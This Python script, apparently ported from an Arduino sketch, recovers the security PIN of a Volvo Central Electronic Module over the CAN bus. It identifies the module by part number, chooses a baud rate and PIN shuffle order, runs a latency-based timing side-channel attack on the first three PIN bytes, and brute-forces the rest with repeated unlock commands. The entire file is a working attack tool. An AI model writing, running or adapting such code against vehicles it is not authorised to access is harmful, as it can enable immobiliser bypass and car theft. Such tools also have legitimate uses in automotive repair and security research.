#!/usr/bin/env python3
import can
import time
import struct
import math
import random
import sys
import os

# --- CONFIGURATION & CONSTANTS ---

REQ_ID = 0x000FFFFE  # Extended ID for requests
CEM_HS_ID = 0x50     # High Speed CEM Node ID
CEM_LS_ID = 0x40     # Low Speed CEM Node ID

CMD_UNLOCK = 0xBE
CMD_UNLOCK_REPLY = 0xB9

# PIN Shuffling Patterns (from .ino)
# Indexes into the raw PIN array [P0, P1, P2, P3, P4, P5]
SHUFFLE_ORDERS = [
    [0, 1, 2, 3, 4, 5],
    [3, 1, 5, 0, 2, 4],
    [5, 2, 1, 4, 0, 3],
    [2, 4, 5, 0, 3, 1]
]

# Known CEM Configurations (P/N -> (Baud, ShuffleIndex))
# 0 = 500k, 1 = 250k, 2 = 125k (We only care about baud rate value)
BAUD_500K = 500000
BAUD_250K = 250000
# Note: P1 High Speed is 500k. P2 uses varying speeds.

CEM_PARAMS = {
    # P1
    8690719: (BAUD_500K, 0), 8690720: (BAUD_500K, 0), 8690721: (BAUD_500K, 0),
    8690722: (BAUD_500K, 0), 30765471: (BAUD_500K, 0), 30728906: (BAUD_500K, 0),
    30765015: (BAUD_500K, 0), 31254317: (BAUD_500K, 0), 31327215: (BAUD_500K, 3),
    31254749: (BAUD_500K, 3), 31254903: (BAUD_500K, 0), 31296881: (BAUD_500K, 3),
    
    # P2 CEM-B (Brick 1999-2004)
    8645716: (BAUD_250K, 0), 8645719: (BAUD_250K, 0), 8688434: (BAUD_250K, 0),
    8688436: (BAUD_250K, 0), 8688513: (BAUD_250K, 2), 30657629: (BAUD_250K, 0),
    9494336: (BAUD_250K, 0), 9494594: (BAUD_250K, 0), 8645171: (BAUD_250K, 0),
    9452553: (BAUD_250K, 0), 8645205: (BAUD_250K, 0), 9452596: (BAUD_250K, 0),
    8602436: (BAUD_250K, 0), 9469809: (BAUD_250K, 0), 8645200: (BAUD_250K, 0),

    # P2 CEM-L (L shaped 2005-2014)
    30682981: (BAUD_500K, 1), 30682982: (BAUD_500K, 1), 30728356: (BAUD_500K, 1),
    30728542: (BAUD_500K, 1), 30765149: (BAUD_500K, 1), 30765646: (BAUD_500K, 1),
    30786475: (BAUD_500K, 1), 30786889: (BAUD_500K, 1), 31282457: (BAUD_500K, 1),
    31314468: (BAUD_500K, 1), 31394158: (BAUD_500K, 1),

    # P2 CEM-H (L shaped H marked 2005-2008)
    30786476: (BAUD_500K, 1), 30728539: (BAUD_500K, 1), 30728357: (BAUD_500K, 1),
    30765148: (BAUD_500K, 1), 30765643: (BAUD_500K, 1), 30795115: (BAUD_500K, 1),
    31282455: (BAUD_500K, 1), 31394157: (BAUD_500K, 1), 30786579: (BAUD_500K, 1),
    30786890: (BAUD_500K, 1) # Added from duplicate in original source
}

LOG_FILE = "crack.log"

def log(msg):
    print(msg)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(msg + "\n")
    except:
        pass

def bcd_to_bin(val):
    return ((val >> 4) * 10) + (val & 0x0F)

def bin_to_bcd(val):
    return ((val // 10) << 4) | (val % 10)


class VolvoCracker:
    def __init__(self, channel='can0'):
        self.channel = channel
        self.bus = None
        self.cem_pn = 0
        self.baud = 500000
        self.shuffle = SHUFFLE_ORDERS[0]
        self.cem_id = CEM_HS_ID # Default to High Speed

    def setup_can(self, bitrate):
        if self.bus:
            self.bus.shutdown()
        
        log(f"Initializing CAN on {self.channel} @ {bitrate}...")
        try:
            # Note: On Pi with socketcan, the bitrate is usually set via 'ip link' 
            # before the script runs. But we can try to set it if we have permissions 
            # or just assume it is set.
            # For this script, we'll assume the OS interface is up, or we just bind to it.
            # If we need to change bitrate, we might need shell commands.
            
            # Simple check if interface is up with correct bitrate? 
            # For now, just bind.
            self.bus = can.interface.Bus(channel=self.channel, bustype='socketcan')
            self.baud = bitrate
            return True
        except Exception as e:
            log(f"Error initializing CAN: {e}")
            return False

    def send_msg(self, arbitration_id, data, is_extended=False):
        msg = can.Message(arbitration_id=arbitration_id, data=data, is_extended_id=is_extended)
        try:
            self.bus.send(msg)
            return time.time() # Return software timestamp of send
        except can.CanError as e:
            log(f"Send Error: {e}")
            return None

    def read_part_number(self):
        """
        Attempts to read CEM Part Number.
        Returns P/N (int) or None.
        """
        # Request: [0xCB, CEM_ID, 0xB9, 0xF0, 0x00, 0x00, 0x00, 0x00]
        # Using extended ID 0x000FFFFE
        
        # Try HS ID first, then LS ID?
        # The .ino tries both. We will focus on HS first.
        
        target_ids = [CEM_HS_ID, CEM_LS_ID]
        
        for tid in target_ids:
            log(f"Attempting to read P/N from Node {hex(tid)}...")
            
            req = [0xCB, tid, 0xB9, 0xF0, 0x00, 0x00, 0x00, 0x00]
            
            # Try a few times
            for _ in range(3):
                # Clear buffer
                while self.bus.recv(timeout=0): pass
                
                self.send_msg(REQ_ID, req, is_extended=True)
                
                # Wait for response
                # Response usually on ID 0x00000003 (HS) or 0x00000005 (LS)
                # Format: Multi-frame ISO-TP usually? 
                # The .ino implementation handles a simplified multi-frame reassembly.
                # Frame 0: [0x8?, ..., D1, D2, D3] (High nibble 8 means first frame?)
                # Frame 1: [0x4?, D4, ...]
                
                start = time.time()
                frames = {}
                
                while time.time() - start < 1.0:
                    msg = self.bus.recv(timeout=0.1)
                    if not msg: continue
                    
                    # Check for response ID
                    # P1/P2 usually reply on specific low IDs
                    rid = msg.arbitration_id
                    if rid not in [0x03, 0x05, 0x00000003, 0x00000005]:
                        # Some might reply with extended ID logic, but let's stick to .ino
                        pass
                    
                    # Logic from .ino:
                    # if frame == 0 && rcv[0] & 0x80: pn parts...
                    # if frame == 1 && !(rcv[0] & 0x40): pn parts...
                    
                    d = msg.data
                    if not d: continue

                    if d[0] & 0x80: # First frame (PCI type 1? or 0x80 marker in their proprietary proto)
                        # .ino: pn = d[5]*10000 + d[6]*100 + d[7] (BCD to Bin)
                        # Actually: pn *= 100; pn += bcdToBin(rcv[5]); ...
                        frames[0] = d
                    elif (d[0] & 0x40) == 0: # Consecutive frame? 
                        # .ino logic: frame == 1 && !(rcv[0] & 0x40)
                        frames[1] = d
                        
                    if 0 in frames and 1 in frames:
                        # Reassemble
                        f0 = frames[0]
                        f1 = frames[1]
                        
                        pn = 0
                        pn = (pn * 100) + bcd_to_bin(f0[5])
                        pn = (pn * 100) + bcd_to_bin(f0[6])
                        pn = (pn * 100) + bcd_to_bin(f0[7])
                        pn = (pn * 100) + bcd_to_bin(f1[1])
                        
                        log(f"Found Part Number: {pn}")
                        return pn
        
        return None

    def configure_for_cem(self, pn):
        if pn in CEM_PARAMS:
            baud, shuff_idx = CEM_PARAMS[pn]
            self.baud = baud
            self.shuffle = SHUFFLE_ORDERS[shuff_idx]
            log(f"CEM Configuration: Baud={baud}, Shuffle Index={shuff_idx}")
            return True
        else:
            log(f"Unknown CEM Part Number: {pn}. Defaulting to P1 settings (500k, Shuffle 0).")
            self.baud = 500000
            self.shuffle = SHUFFLE_ORDERS[0]
            return False

    def unlock_attempt(self, pin_bytes, measure_latency=False):
        """
        Sends PIN, checks for success.
        If measure_latency is True, returns (success, latency_seconds).
        Else returns (success, 0).
        """
        # Prepare data [CEM_ID, 0xBE, P_shuffled...]
        data = [self.cem_id, CMD_UNLOCK] + [0]*6
        
        # Apply shuffle
        # pin_bytes is [b0, b1, b2, b3, b4, b5]
        # shuffle order is e.g. [0, 1, 2, 3, 4, 5] map
        # data[2 + shuffle_order[i]] = pin_bytes[i]
        
        for i in range(6):
            data[2 + self.shuffle[i]] = pin_bytes[i]
            
        # Send
        # self.bus.send ...
        msg = can.Message(arbitration_id=REQ_ID, data=data, is_extended_id=True)
        
        # We need precise timing here for the attack
        # Drain buffer first to avoid reading old messages
        while self.bus.recv(timeout=0): pass
        
        try:
            # We want the timestamp of when it was SENT (approx)
            self.bus.send(msg)
            t_send = time.time() 
        except can.CanError:
            return False, 0

        # Wait for reply
        # Reply format: [CEM_ID, 0xB9, 0x00...] (Success) or other (Fail)
        # Timeout needs to be short but enough for CEM processing
        
        t_recv = 0
        success = False
        
        # Wait up to 0.1s
        start_wait = time.time()
        while time.time() - start_wait < 0.1:
            rx = self.bus.recv(timeout=0.02)
            if not rx: continue
            
            # Check if it's from CEM
            if len(rx.data) > 2 and rx.data[0] == self.cem_id:
                t_recv = rx.timestamp # Use kernel/driver timestamp if available
                if t_recv == 0.0: t_recv = time.time() # Fallback
                
                # Check Success
                if rx.data[1] == CMD_UNLOCK_REPLY and rx.data[2] == 0x00:
                    success = True
                
                # We got a relevant reply, stop waiting
                break
        
        if t_recv == 0: 
            return False, 0 # No reply
            
        latency = t_recv - t_send
        return success, latency

    def crack_timing(self, known_bytes=0):
        """
        Attempt to find the first few bytes using timing analysis.
        This is experimental on Pi.
        """
        log(f"Starting Timing Attack for first 3 bytes...")
        
        current_pin = [0, 0, 0, 0, 0, 0]
        
        # We try to find bytes 0, 1, 2
        for pos in range(known_bytes, 3):
            log(f"Analyzing PIN byte {pos}...")
            
            # Histogram: [latency_sum, count] for each candidate byte value (0x00-0x99 BCD)
            stats = {}
            
            # Candidates: 0-99 (BCD)
            # To save time, we might only test a subset or do it in passes. 
            # The .ino does 10-300 samples per candidate.
            
            candidates = [bin_to_bcd(x) for x in range(100)]
            
            best_byte = 0
            best_lat = 0
            
            # We will use a smaller sample size than .ino because Python is slow
            SAMPLES = 20 
            
            log(f"Collecting {SAMPLES} samples per candidate (00-99)...")
            
            for b_val in candidates:
                current_pin[pos] = b_val
                
                total_lat = 0
                valid_samples = 0
                
                for _ in range(SAMPLES):
                    # Randomize next bytes to average out noise
                    if pos + 1 < 6:
                        current_pin[pos+1] = bin_to_bcd(random.randint(0, 99))
                    
                    suc, lat = self.unlock_attempt(current_pin, measure_latency=True)
                    if suc:
                        log(f"!!! ACCIDENTAL SUCCESS !!! PIN: {current_pin}")
                        return current_pin
                    
                    if lat > 0:
                        total_lat += lat
                        valid_samples += 1
                
                if valid_samples > 0:
                    avg_lat = total_lat / valid_samples
                    stats[b_val] = avg_lat
                    # print(f"Byte {hex(b_val)}: {avg_lat*1000:.3f}ms", end='\r')
            
            # Find candidate with MAX latency (usually correct byte takes longer? 
            # Actually .ino looks for latency profiles. 
            # In side channels, correct processing often takes *longer* or *shorter* distinctively.
            # .ino code sorts by 'latency' descending. So we look for MAX latency.
            
            sorted_candidates = sorted(stats.items(), key=lambda item: item[1], reverse=True)
            
            if not sorted_candidates:
                log("Timing attack failed to get data. Aborting to Brute Force.")
                return None
                
            best_byte = sorted_candidates[0][0]
            log(f"\nByte {pos} Probable Match: {hex(best_byte)} (Lat: {sorted_candidates[0][1]*1000:.3f}ms)")
            log(f"Top 3: {[hex(x[0]) for x in sorted_candidates[:3]]}")
            
            current_pin[pos] = best_byte
            
            # Reset next byte to 0 for next pass
            if pos + 1 < 6: current_pin[pos+1] = 0

        return current_pin

    def brute_force(self, start_pin):
        """
        Brute forces the remaining bytes.
        start_pin: 6-byte array with solved bytes filled, others 0.
        We assume bytes 0,1,2 are solved, 3,4,5 need forcing?
        Or generally, just iterate from where we left off.
        """
        log("Starting Brute Force...")
        
        # Determine which bytes to iterate.
        # We'll assume the user wants to brute force the last N bytes or 
        # we iterate the whole space if start_pin is all 0.
        
        # For safety/simplicity on this slow platform, we'll iterate 
        # the last 3 bytes (1,000,000 combinations) if first 3 are fixed.
        # If not, it's 100^6 (too big).
        
        # Convert fixed part to integer base
        # This implementation assumes we are iterating the LAST 3 bytes.
        
        fixed_part_str = f"{bcd_to_bin(start_pin[0]):02d}{bcd_to_bin(start_pin[1]):02d}{bcd_to_bin(start_pin[2]):02d}"
        log(f"Fixed Prefix: {fixed_part_str} XX XX XX")
        
        # Range: 0 to 999999 (last 3 bytes)
        total = 1000000
        
        start_t = time.time()
        
        for i in range(total):
            # i is 0 to 999999.
            # Convert to BCD bytes
            # s = f"{i:06d}" # e.g. "001234"
            # But wait, each byte is 00-99. 
            # So 3 bytes is 00-99, 00-99, 00-99.
            
            # Optimized iteration
            b3 = bin_to_bcd((i // 10000) % 100)
            b4 = bin_to_bcd((i // 100) % 100)
            b5 = bin_to_bcd(i % 100)
            
            current_pin = list(start_pin)
            current_pin[3] = b3
            current_pin[4] = b4
            current_pin[5] = b5
            
            if i % 1000 == 0:
                elapsed = time.time() - start_t
                rate = i / elapsed if elapsed > 0 else 0
                eta = (total - i) / rate if rate > 0 else 0
                log(f"Progress: {i}/{total} ({i/total*100:.1f}%) Rate: {rate:.1f}/s ETA: {eta/60:.1f}m - Trying: {current_pin}")
            
            suc, _ = self.unlock_attempt(current_pin)
            if suc:
                log(f"\n!!! FOUND PIN: {current_pin} !!!")
                return current_pin
                
        return None

    def run(self):
        log("--- Volvo CEM Cracker (Pi Port) ---")
        
        # 1. Setup CAN
        if not self.setup_can(500000): # Default to 500k
            log("Failed to setup CAN. Check cabling and interfaces.")
            return
            
        # 2. Detect CEM
        pn = self.read_part_number()
        if pn:
            self.configure_for_cem(pn)
        else:
            log("Could not detect CEM Part Number. Using Defaults.")
        
        # 3. Strategy
        # Try timing attack for first 3 bytes?
        # On Pi, this is risky.
        log("Starting Cracking Sequence.")
        
        # partial_pin = self.crack_timing(known_bytes=0)
        # if not partial_pin:
        #    partial_pin = [0,0,0,0,0,0]
        
        # FAIL-SAFE: The timing attack on Pi is likely garbage. 
        # For this first version, I will default to a range scan or mock behavior
        # unless I can verify it works.
        # But per requirements "Port functionality", I included it.
        # Let's try to run it.
        
        partial_pin = [0,0,0,0,0,0]
        
        # Prompt or Default?
        # Since this is headless service usually, we default to:
        # Try finding 3 bytes via timing, then brute force rest.
        
        found_timing = self.crack_timing(known_bytes=0)
        
        if found_timing:
            log(f"Timing Attack result: {found_timing}")
            partial_pin = found_timing
        else:
            log("Timing attack yielded no clear results. Starting from 00 00 00...")
        
        # 4. Brute Force the rest
        # We assume timing gave us bytes 0,1,2.
        final_pin = self.brute_force(partial_pin)
        
        if final_pin:
            log("Done.")
        else:
            log("Failed to find PIN.")

if __name__ == "__main__":
    cracker = VolvoCracker()
    cracker.run()
